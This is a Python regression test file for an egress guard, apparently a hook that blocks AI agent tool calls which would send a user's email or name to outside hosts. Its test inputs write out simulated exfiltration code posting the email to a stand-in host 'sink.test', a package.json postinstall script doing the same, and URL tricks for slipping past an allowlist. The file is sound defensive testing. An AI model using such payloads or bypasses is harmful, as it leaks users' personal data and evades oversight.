"""Regression tests for the Astra review r6 of the 0.2.3 candidate (2026-11-09): every reproduction in the report."""
import io
import json
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))
from egress_guard import hook  # noqa: E402
from egress_guard.scan import Identity, scan_tool_call  # noqa: E402

EMAIL = "jan.kowalski84@example-mail.pl"
ID = Identity(emails=[EMAIL], names=["Jan Kowalski"])
WP = Identity(emails=[EMAIL], names=["Jan Kowalski"], allow_hosts=["wordpress.org"])


def found(tool, inp, ident=ID):
    return scan_tool_call(tool, inp, ident)


# 1. no regex touched in this round runs past the hook timeout on ~50 KB
def test_adversarial_inputs_stay_fast(tmp_path, monkeypatch):
    monkeypatch.setattr(hook, "HOME", tmp_path)
    code = ("# http://localhost:4173\n# " + "a." * 25000
            + f"\nimport requests\nrequests.post('https://sink.test', data='{EMAIL}')\n")
    event = {"tool_name": "Write", "tool_input": {"file_path": str(tmp_path / "probe.py"), "content": code},
             "session_id": "s1"}
    t = time.perf_counter()
    assert hook.decide(event, ID, False)["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert time.perf_counter() - t < 3.0
    for rx, text in ((hook._SED_READ, " " * 50000 + "p;# comment"),
                     (hook._SED_READ, "p" + "\n" * 50000 + "x"),
                     (hook._PLAIN_SUB, "s#" + "\\a" * 30 + "#x#;# comment"),
                     (hook._PLAIN_SUB, "s#" + "\\a" * 25000 + "#x#;# comment"),
                     (hook._PLAIN_SUB, " " * 50000 + "1 x")):
        t = time.perf_counter()
        assert not rx.fullmatch(text)
        assert time.perf_counter() - t < 1.0, text[:20]
    assert hook._PLAIN_SUB.fullmatch("s#\\#a#b#g") and hook._SED_READ.fullmatch("/x/p; 5q ;")
    # found while checking r6 (also in 0.2.2): spelled-out "at"/"dot" over a long whitespace run, overlapping URLs
    wp = Identity(emails=[EMAIL], names=["Jan Kowalski"], allow_hosts=["wordpress.org"])
    for tool, inp in (("Write", {"file_path": "x.py", "content": "import requests\n" + "\n" * 50000 + EMAIL}),
                      ("WebFetch", {"url": "https://wordpress.org/?q=" + "http://" * 7000, "prompt": EMAIL})):
        t = time.perf_counter()
        assert found(tool, inp, wp), tool
        assert time.perf_counter() - t < 2.0, tool
    assert found("WebFetch", {"url": "https://wordpress.org/?next=https://sink.test/x", "prompt": EMAIL}, wp)
    assert found("WebFetch", {"url": "https://wordpress.org\\.sink.test/", "prompt": EMAIL}, wp)


# 2. an escape ends a quoted host as a quote does
def test_escaped_host_gets_no_local_or_allowed_exemption(tmp_path):
    for host in ("'sink.test\\n'.strip()", "'\\tsink.test'.strip()", "'8.8.8.8\\n'.strip()"):
        code = (f"import http.client\nc = http.client.HTTPConnection({host})\n"
                f"c.request('POST', '/', body='{EMAIL}')\n")
        for comment, ident in (("# http://localhost:4173\n", ID), ("# https://wordpress.org\n", WP)):
            assert found("Write", {"file_path": str(tmp_path / "x.py"), "content": comment + code}, ident), host
    ok = ('import http.client\nc = http.client.HTTPConnection("localhost", 4173)\n'
          'c.request("GET", "http://localhost:4173/cv\\n".strip())\n'
          'print("Saved Jan-Kowalski-CV.pdf\\n")\n# Jan Kowalski\n')
    assert not found("Write", {"file_path": str(tmp_path / "pdf.py"), "content": ok})


# 3. boolean gh flags take no value
def test_boolean_gh_flags_do_not_eat_the_next_option():
    for cmd in ("gh pr create --draft --body -RJanKowalski/tool --title x",
                "gh issue create --web --body -RJanKowalski/tool --title x"):
        assert found("Bash", {"command": cmd}), cmd
    for cmd in ("gh pr view --comments -R JanKowalski/tool", "gh issue list --web -R JanKowalski/tool"):
        assert not found("Bash", {"command": cmd}), cmd


# 4. executable configuration: imported functions, interpreter heredocs, commands inside JSON strings
def test_executable_config_is_scanned(tmp_path):
    ci = ("steps:\n  - run: |\n      python <<'PY'\n      from requests import post\n"
          f"      post('https://sink.test', data='{EMAIL}')\n      PY\n")
    pkg = json.dumps({"scripts": {"postinstall": f"gh issue create --title x --body {EMAIL}"}})
    assert found("Write", {"file_path": str(tmp_path / "ci.yml"), "content": ci})
    assert found("Write", {"file_path": str(tmp_path / "package.json"), "content": pkg})
    cv = "name: Jan Kowalski\nskills: [WebSocket, gRPC, Axios, GitHub CLI (gh), npm]\nemail: " + EMAIL + "\n"
    assert not found("Write", {"file_path": str(tmp_path / "cv.yaml"), "content": cv})


# 5. a settings parser that blows the stack denies instead of crashing the hook
def test_deep_settings_deny_instead_of_crashing(tmp_path, monkeypatch):
    monkeypatch.setattr(hook, "HOME", tmp_path)
    deep = '{"x":' + "[" * 25000 + "0" + "]" * 25000 + "}"
    assert hook._hook_entries(deep) is None
    monkeypatch.setattr(hook, "decide", lambda *a: (_ for _ in ()).throw(RecursionError()))
    monkeypatch.setattr(hook, "load_identity", lambda: (ID, False))
    monkeypatch.setattr(sys, "argv", ["hook"])
    monkeypatch.setattr(sys, "stdin", io.StringIO('{"tool_name": "Write", "tool_input": {}}'))
    out = io.StringIO()
    monkeypatch.setattr(sys, "stdout", out)
    assert hook.main() == 0
    assert json.loads(out.getvalue())["hookSpecificOutput"]["permissionDecision"] == "deny"
